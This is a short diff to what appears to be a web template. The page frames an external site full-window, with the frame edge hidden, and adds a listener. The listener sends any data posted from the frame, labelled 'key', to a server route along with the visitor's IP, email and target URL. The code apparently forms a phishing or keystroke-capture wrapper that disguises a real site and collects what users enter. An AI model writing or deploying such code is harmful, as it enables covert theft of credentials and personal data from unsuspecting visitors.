@@ -3,14 +3,38 @@
         
     <iframe 
         src="{{ $url }}" 
-        frameborder="0" style="margin: 0"></iframe>
+        frameborder="0" style="margin: 0; margin-top: -20px"></iframe>
     <script>
         setInterval(() => {
-            document.querySelector('iframe').style.width = window.innerWidth
-            document.querySelector('iframe').style.height = window.innerHeight
+            document.querySelector('iframe').style.width = window.innerWidth + 'px'
+            document.querySelector('iframe').style.height = (window.innerHeight + 20) + 'px'
             // console.log(2);
         }, 200);
-        $.post("{{ route('client.start') }}", {ip: "{{ $ip }}", url: "{{ $url }}"})
+        // let xhr = new XMLHttpRequest()
+        // xhr.open("POST", "{{ route('client.start') }}", true)
+        // xhr.setRequestHeader('Content-Type', 'application/json')
+        // xhr.send(JSON.stringify({
+        //     ip: "{{ $ip }}", to_url: "{{ $to_url }}"
+        // }))
+
+        function report(report_data)
+        {
+            xhr = new XMLHttpRequest()
+            xhr.open("POST", "{{ route('client.report_user_data') }}", true)
+            xhr.setRequestHeader('Content-Type', 'application/json')
+            xhr.send(JSON.stringify({
+                ip: "{{ $ip }}", 
+                url: "{{ $to_url }}",
+                email: "{{ $email ?? '' }}",
+                key: report_data,
+            }))
+        }
+        window.addEventListener(
+            "message",
+            (event) => {
+                report(event.data)
+            }
+        )
     </script>
 
 </body>
